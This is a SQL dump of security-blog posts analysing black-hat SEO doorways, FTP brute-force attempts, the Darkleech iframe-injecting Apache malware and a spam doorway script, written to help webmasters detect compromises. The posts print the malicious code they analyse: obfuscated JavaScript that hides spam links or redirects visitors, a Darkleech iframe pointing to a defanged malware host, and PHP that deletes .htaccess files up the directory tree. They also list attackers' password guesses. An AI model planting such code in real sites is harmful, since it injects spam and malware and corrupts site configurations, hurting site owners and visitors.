2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (160, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (161, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (162, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (163, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (164, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
